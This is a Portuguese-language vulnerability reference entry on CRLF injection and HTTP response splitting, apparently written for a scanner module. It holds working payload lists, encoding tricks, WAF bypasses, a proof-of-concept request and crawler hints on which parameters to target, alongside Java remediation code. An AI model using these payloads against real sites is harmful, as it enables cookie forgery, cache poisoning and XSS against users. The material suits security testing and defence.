---
id: crlf_injection
title: "CRLF Injection / HTTP Response Splitting"
module: "crlf"
severity: "MEDIUM"
cwe_id: "CWE-113"
cwe_title: "Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Response Splitting')"
cvss_vector: "AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"
vrt_id: "cross_site_scripting_xss.reflected_xss"
---

## Summary
Injeção de sequências CR/LF em headers ou parâmetros permite criar cabeçalhos e respostas HTTP forjadas, levando a XSS, cache poisoning, fixação de sessão e bypass de controles.

## Description
O protocolo HTTP usa `\r\n` para separar headers e o corpo. Quando a aplicação insere entrada do usuário em um header (`Location`, `Set-Cookie`, `Content-Type`, `X-Forwarded-*`) ou em um contexto que será interpretado como header, um atacante pode injetar novas linhas e criar headers adicionais ou até uma resposta completa (HTTP response splitting).

Variações:
- **Header injection:** `?lang=en%0d%0aSet-Cookie:admin=1`.
- **Response splitting:** dois CRLF seguidos para terminar headers e iniciar corpo com HTML/JS.
- **Log injection:** quebra de linha em logs pode forjar entradas e confundir SIEM.
- **Cache poisoning:** headers injetados são cacheados e servidos a outras vítimas.
- **Session fixation:** `Set-Cookie` forjado define sessão do atacante.
- **Open redirect bypass:** `Location` com CRLF permite adicionar headers e corpo.

O bug depende de o servidor/proxy não normalizar ou rejeitar CR/LF. Frameworks modernos geralmente bloqueiam, mas wrappers, gateways, linguagens legadas e bibliotecas de terceiros podem reintroduzir a falha.

## Impact
- XSS em respostas que refletem headers (ex.: `Location` em página de erro).
- Cache poisoning e envenenamento de respostas para outros usuários.
- Fixação de sessão e roubo de cookies.
- Bypass de CSP, CORS e redirecionamentos.
- Falsificação de logs e dificuldade de auditoria.
- Impacto MEDIUM, escalando para HIGH em cache poisoning ou XSS armazenado.

## Payloads and Bypasses
```text
# Injeção básica em parâmetro refletido em header
?lang=en%0d%0aSet-Cookie:session=atacante
?url=https://alvo.com%0d%0aSet-Cookie:admin=true
?next=/home%0d%0aContent-Length:0

# Response splitting
?name=x%0d%0a%0d%0a<html><script>alert(document.domain)</script></html>
?q=x%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script>

# Variações de newline
%0a
%0d
%0d%0a
%0a%0d
\r\n
\n
\r

# Double encoding
%250d%250a
%250a
%25250d%25250a

# Unicode / overlong
%E5%98%8A%E5%98%8D
%C0%8D%C0%8A

# Header injection em User-Agent / Referer / X-Forwarded-Host
User-Agent: x%0d%0aX-Forwarded-Host: evil.com
Referer: https://alvo.com/%0d%0aSet-Cookie:admin=1
```

PoC de response splitting:
```http
GET /redirect?url=%0d%0a%0d%0a<script>alert(document.domain)</script> HTTP/1.1
Host: alvo.com
```

Bypasses de WAF:
```text
- CRLF codificado uma ou duas vezes
- Mistura de \r e \n
- Unicode line separators (U+2028/U+2029) quando o parser normaliza
- Espaços/tabs entre header e valor
- Injeção via header de proxy (X-Forwarded-Host, X-Original-URL)
- Injeção em nome de cookie/atributo
- Quebra de linha em multipart/form-data
```

Casos reais e mentalidade de ataque (RWBH): Twitter e Yahoo (headers refletidos) ilustram response splitting, `Set-Cookie` forjado e envenenamento de cache; o atacante testa `%0d%0a`, dupla codificação e headers de proxy.

## Target Context (Crawler Hints)
- **Parâmetros comuns:** `url`, `redirect`, `next`, `return`, `lang`, `locale`, `page`, `file`, `name`, `email`, `subject`, `host`, `domain`, `callback`, `state`.
- **Headers comuns:** `Host`, `X-Forwarded-Host`, `X-Forwarded-For`, `X-Forwarded-Proto`, `Referer`, `User-Agent`, `Origin`.
- **Paths comuns:** `/redirect`, `/login`, `/logout`, `/set-locale`, `/api/redirect`, `/download`, `/error`, `/search`.
- **Sinais:** entrada refletida em `Location`, `Set-Cookie` ou `Content-Type`; headers duplicados; resposta com `\r\n` no valor; logs com linhas forjadas.

## Recommendation
1. Rejeitar qualquer entrada que contenha `\r`, `\n` ou caracteres de controle antes de inserir em headers; usar validação de allowlist.
2. Usar APIs do framework que codificam headers automaticamente; nunca concatenar strings em `Location`/`Set-Cookie`.
3. Em Java, usar `HttpServletResponse.setHeader()` com valor sanitizado e validar com regex; evitar `addHeader` com entrada crua.
4. Em Nginx, usar `$uri` normalizado e `return 302` com destino validado; não repassar headers não confiáveis.
5. Normalizar e rejeitar sequências codificadas (`%0d`, `%0a`, `%250d`) após decodificação.
6. Configurar proxies/WAF para bloquear CR/LF em headers e parâmetros, mas não confiar apenas neles.
7. Sanitizar logs (escapar newlines) e nunca usar entrada do usuário como nome de header.
8. Exemplo Java:
```java
private static final Pattern CRLF = Pattern.compile("[\\r\\n\\u0000]");

public void redirect(HttpServletResponse res, String target) throws IOException {
    if (CRLF.matcher(target).find()) throw new IllegalArgumentException("invalid target");
    res.setStatus(302);
    res.setHeader("Location", target);
}
```
9. Testar respostas com `curl -i` e inspecionar headers/corpo após cada entrada.
